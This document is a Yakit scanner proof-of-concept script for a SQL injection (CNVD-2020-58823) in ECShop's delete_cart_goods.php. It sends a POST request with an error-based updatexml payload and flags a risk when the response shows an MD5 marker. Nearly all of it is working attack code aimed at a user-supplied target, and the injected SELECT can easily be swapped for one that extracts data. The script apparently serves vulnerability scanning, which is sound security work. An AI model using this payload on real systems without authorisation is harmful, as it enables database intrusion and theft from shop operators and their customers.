content:
##server:Ecshop
##type:poc
##params:root_url
##name:ecshop_cnvd_2020_58823_sqli_poc
##severity:medium
##out_put:ecshop_cnvd_2020_58823_sqli_poc_res



loglevel(`info`)
yakit.AutoInitYakit()



root_url=cli.String("root_url")


poc=func(addr,isTls){
    packet=`POST /delete_cart_goods.php HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Encoding: gzip
Content-Length: 192
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

{{params(payload)}}`

    rsp,req,err=poc.HTTP(
        packet, 
        poc.https(isTls),
        poc.params({"target":addr,"payload":`id=0||(updatexml(1,concat(0x7e,(select%20md5(489165)),0x7e),1))`}))
    if str.MatchAllOfSubString(rsp, `ecb7599f1937c48edbaed92ac38f9`){
        risk.NewRisk(root_url, 
            risk.severity("high"), 
            risk.title(sprintf("FOUND %v", "ecshop_cnvd_2020_58823_sqli_漏洞存在")),
            risk.type("SQL注入"), risk.typeVerbose("SQL注入"),
            risk.request(req),
            risk.response(rsp),
            risk.details({
                "url": root_url,
                "ecshop_cnvd_2020_58823_sqli_poc_res":true,
            }),)
    }
}




main=func(){
    ip, port, err = str.ParseStringToHostPort(root_url)
    if err != nil {
        die(err)
    }
    // poc(ip, port)
    addr=str.HostPort(ip, port)
    isTls=str.IsTLSServer(addr)
    poc(addr,isTls)

}

main()
